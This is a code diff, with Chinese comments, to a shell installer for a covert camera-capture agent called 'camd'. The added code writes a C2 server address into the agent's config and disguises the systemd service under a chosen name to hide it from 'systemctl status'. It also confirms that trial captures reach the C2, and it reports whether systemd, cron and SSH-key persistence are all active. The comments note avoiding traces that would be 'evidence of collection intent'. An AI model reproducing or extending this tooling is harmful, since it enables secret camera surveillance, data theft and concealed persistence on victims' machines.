@@ -373,6 +373,12 @@ write_conf() {
         printf 'C2_ADDR=%s\n' "$C2"
         printf 'CAMD_KEY=%s\n' "$KEY"
         printf 'CAMD_BACKEND=%s\n' "$BACKEND"
+        # 服务名必须与部署侧落点同源。此前驻留段（persist.c）硬编码项目名，
+        # 而这里已把落点伪装成 $NAME：两者不一致在真机上是三重合失效——
+        # 伪装失效（systemctl status 读出项目名）、双重驻留（两套 unit 同时
+        # 拉起、两个进程抢摄像头）、卸载残留（uninstall 只清一套）。
+        # 名字的产地只能有一处，就是这里的 $NAME。
+        printf 'CAMD_SVC_NAME=%s\n' "$NAME"
         # 只在真正提供了公钥时才写。写成空串会让 camd 以为"配置了但读不到"，
         # 从而走 FATAL 分支——那是把"未启用"误报成"配置损坏"。
         [ -n "$PUBKEY_SRC" ] && \
@@ -480,6 +486,16 @@ PrivateTmp=true
 [Install]
 WantedBy=multi-user.target
 EOF
+    # 【单元文件权限必须显式设置——实测撞出来的缺陷】
+    # 此前 conf/bin/run.sh/cron/pubkey/ca 都 chmod 了，唯独单元文件没有，
+    # 权限交给 umask 兜底。而 systemd 对单元文件有一项硬性检查：
+    # 带可执行位的单元会被直接拒绝加载
+    #   "Configuration file ... is marked executable.
+    #    Please remove executable permission bits."
+    # 于是失败形态是：单元写进去了、校验报 WARN、降级 cron、部署报"成功"，
+    # 而 systemd 段静默不生效，部署者看到的全绿。umask 非 022 的环境
+    # （部分容器/镜像 umask 000）在真机上同样会踩到。
+    chmod 0644 "$UNIT" 2>/dev/null || :
     # 静态校验。判据**不是退出码**——这是实测踩出来的：
     #
     #   systemd-analyze verify /tmp/t.service
@@ -621,7 +637,20 @@ verify_run() {
     set -a
     . "$CONF_FILE"
     set +a
-    RUN_OUT=$("$BIN_DST" --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
+    # 【--root 必须与驻留路径同源——此前不同源，实测撞出来的】
+    # 此前这里固定传 --root "$LIB_DIR/agent"，而真实驻留路径（run.sh）
+    # 不传 --root（NULL = 真实根）。后果有两层：
+    #   1) 试运行度量的驻留写在 LIB_DIR/agent 这个假子根里，与真实驻留
+    #      根本不是同一处——"三段全活"的报告说的不是真机上那三段；
+    #   2) 真机部署时会在 /var/lib/<NAME>/agent 下留一套永不生效的驻留
+    #      痕迹（垃圾，且是采集意图的旁证）。
+    # 正确做法：假根模式传 --root "$PREFIX"（隔离），真机模式不传
+    #（NULL = 真实根），与 run.sh 完全一致。
+    if [ -n "$PREFIX" ]; then
+        RUN_OUT=$("$BIN_DST" --root "$PREFIX" --batches 1 --frames 1 2>&1)
+    else
+        RUN_OUT=$("$BIN_DST" --batches 1 --frames 1 2>&1)
+    fi
     RC=$?
     N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
     [ -n "$N" ] || N=0
@@ -643,6 +672,31 @@ verify_run() {
     fi
     [ "$N" -gt 0 ] || { WARN "试运行产出 0 字节"; return 0; }
     OK "试运行已送达 C2（$N 字节信元，$CAMD_SINK）"
+
+    # 【三段驻留状态必须呈现——此前整段被丢弃】
+    # camd 打了 methods=systemd:x,cron:y,sshkey:z，而本函数只 sed 出
+    # bytes_out，那行被静默丢掉。后果：部署报告只有"成功 N 失败 0"，
+    # 部署者无法知道三段里哪几段真的活了。而 persist_linux_ensure 走
+    # "部分成功"语义——只要有一段装上就返回成功，于是"只有 cron 活着"
+    # 与"三段全活"在报告上完全一致。这是最难发现的一类失效：报告全绿、
+    # 服务在跑，而重启后（cron 段依赖目标机有 crond）可能一段都不剩。
+    # 状态呈现是痕迹对账守卫的输入，不得省略。
+    _m=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*methods=systemd:\([0-9-]*\),cron:\([0-9-]*\),sshkey:\([0-9-]*\).*/\1 \2 \3/p' | head -1)
+    if [ -n "$_m" ]; then
+        set -- $_m
+        _sd=$1; _cr=$2; _sk=$3
+        _live=0
+        [ "$_sd" = 1 ] && _live=$((_live+1))
+        [ "$_cr" = 1 ] && _live=$((_live+1))
+        [ "$_sk" = 1 ] && _live=$((_live+1))
+        printf '%s\n' "[INFO] 驻留三段: systemd=$_sd cron=$_cr sshkey=$_sk（生效 $_live/3）"
+        if [ "$_live" -lt 3 ]; then
+            WARN "驻留仅 $_live/3 段生效——报告成功不等于三段都在，逐段核对见 status"
+        fi
+    else
+        # 解析不到即视为失守：宁可报出来，也不要"看起来没这条信息"。
+        WARN "未能解析驻留三段状态（methods 行缺失）——无法确认哪几段生效"
+    fi
     return 0
 }
 
